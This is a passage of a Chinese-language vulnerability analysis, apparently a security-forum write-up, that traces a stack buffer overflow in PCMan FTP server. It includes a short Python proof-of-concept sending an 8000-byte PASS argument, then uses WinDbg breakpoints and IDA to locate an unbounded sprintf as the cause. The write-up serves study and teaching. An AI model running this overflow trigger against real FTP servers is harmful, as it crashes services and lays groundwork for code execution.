### POC

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 21))
s.recv(1024)

User = 'anonymous'
Password = 'A' * 8000

s.send("USER" + User + "\r\n")
print s.recv(1024)

s.send("PASS" + Password + "\r\n")
print s.recv(1024)
```

运行 POC，触发漏洞。

![](http://bbs.pediy.com/upload/attach/201704/658861_mmfg4hb9kit9rok.jpg)

我们可以看出返回值被`AAAA`覆盖了，此时的`esp`之前应该就是返回值，所以我们可以在`0012ed6c`之前下硬件写入条件断点，重新打开 WinDbg，附加 PCMan，用 WinDbg 下如下命令。此时我们只要关注堆栈返回值上面几处的值是否被覆盖了`AAAA`，等待断点命中。

```text
ba w4 0012ed5c ".if(poi(0012ed5c)=0x41414141){}.else{gc}"
```

运行 POC 可以看到在`004173af`断下。此时我们栈中已经被 A 覆盖了大部分，但是返回值还没有被覆盖，我们可以看到：

![](https://bbs.kanxue.com/upload/attach/201704/658861_g6rct17ypjtbp8v.jpg)

在 IDA 中定位此处的 EIP，看出此时在`write_string`函数中，调用`write_char`函数循环向栈写内容。

![](https://bbs.kanxue.com/upload/attach/202002/658861_bmn582dayeyg0tn.jpg)

我们接着向上回溯，看看调用此函数的是谁。WinDbg 单步，或者用`gu`执行到函数返回。在函数回溯过程中发现`sprintf`函数，按 F5 查看，此时的`sprintf`函数后面带有`%s`，所以是有可能发生字符串溢出的。

![](https://bbs.kanxue.com/upload/attach/201704/658861_jhgu0dx90nh8lpq.jpg)

调用完`sprintf`函数过后，返回时发现堆栈已经被`AAAA`覆盖了。我们可以在`sprintf`处下断点验证调用此函数前后堆栈的情况。我们可知函数的返回值存放在`0012ed68+4`中。

![](https://bbs.kanxue.com/upload/attach/201704/658861_jwgukgwgba58pcm.jpg)

重新启动 WinDbg，附加 PCMan 程序，对`sprintf`函数重点观察调用前后的堆栈变化。我们在 IDA 中可以看到，`sprintf`参数的最后一个是将字符串写入缓冲区中，没有进行长度限制，导致了堆栈破坏，而且`ecx`表明的是将要拷贝的字符串缓冲区。
